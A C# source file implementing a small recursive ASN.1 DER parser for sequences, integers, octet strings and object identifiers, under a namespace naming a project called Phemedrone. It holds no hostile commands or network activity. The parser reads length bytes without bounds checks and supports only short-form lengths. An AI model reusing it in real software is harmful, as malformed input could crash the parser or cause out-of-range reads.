using System;
using Phemedrone.Classes;

namespace Phemedrone.Cryptography
{
    public class Asn1Der
    {
        public enum Type
        {
            Sequence = 0x30,
            Integer = 0x02,
            OctetString = 0x04,
            ObjectIdentifier = 0x06
        }
        
        public Asn1DerObject Parse(byte[] toParse)
        {
            var parsedData = new Asn1DerObject();

            for (var i = 0; i < toParse.Length; i++)
            {
                byte[] data;
                int len;
                switch ((Type)toParse[i])
                {
                    case Type.Sequence:
                        if (parsedData.Lenght == 0)
                        {
                            parsedData.Type = Type.Sequence;
                            parsedData.Lenght = toParse.Length - (i + 2);
                            data = new byte[parsedData.Lenght];
                        }
                        else
                        {
                            parsedData.Objects.Add(new Asn1DerObject()
                            {
                                Type = Type.Sequence,
                                Lenght = toParse[i + 1]
                            });
                            data = new byte[toParse[i + 1]];
                        }
                        len = (data.Length > toParse.Length - (i + 2)) ? toParse.Length - (i + 2) : data.Length;
                        Array.Copy(toParse, i + 2, data, 0, len);
                        parsedData.Objects.Add(this.Parse(data));
                        i = i + 1 + toParse[i + 1];
                        break;
                    case Type.Integer:
                        parsedData.Objects.Add(new Asn1DerObject()
                        {
                            Type = Type.Integer,
                            Lenght = toParse[i + 1]
                        });
                        data = new byte[toParse[i + 1]];
                        len = ((i + 2) + toParse[i + 1] > toParse.Length) ? toParse.Length - (i + 2) : toParse[i + 1];
                        Array.Copy(toParse, i + 2, data, 0, len);
                        var parsedDataArray = parsedData.Objects.ToArray();
                        parsedData.Objects[parsedDataArray.Length - 1].Data = data;
                        i = i + 1 + parsedData.Objects[parsedDataArray.Length - 1].Lenght;
                        break;
                    case Type.OctetString:
                        parsedData.Objects.Add(new Asn1DerObject()
                        {
                            Type = Type.OctetString,
                            Lenght = toParse[i + 1]
                        });
                        data = new byte[toParse[i + 1]];
                        len = ((i + 2) + toParse[i + 1] > toParse.Length) ? toParse.Length - (i + 2) : toParse[i + 1];
                        Array.Copy(toParse, i + 2, data, 0, len);
                        var parsedDataArrayTwo = parsedData.Objects.ToArray();
                        parsedData.Objects[parsedDataArrayTwo.Length - 1].Data = data;
                        i = i + 1 + parsedData.Objects[parsedDataArrayTwo.Length - 1].Lenght;
                        break;
                    case Type.ObjectIdentifier:
                        parsedData.Objects.Add(new Asn1DerObject()
                        {
                            Type = Type.ObjectIdentifier,
                            Lenght = toParse[i + 1]
                        });
                        data = new byte[toParse[i + 1]];
                        len = ((i + 2) + toParse[i + 1] > toParse.Length) ? toParse.Length - (i + 2) : toParse[i + 1];
                        Array.Copy(toParse, i + 2, data, 0, len);
                        var parsedDataArrayThree = parsedData.Objects.ToArray();
                        parsedData.Objects[parsedDataArrayThree.Length - 1].Data = data;
                        i = i + 1 + parsedData.Objects[parsedDataArrayThree.Length - 1].Lenght;
                        break;
                }
            }

            return parsedData;
        }
    }
}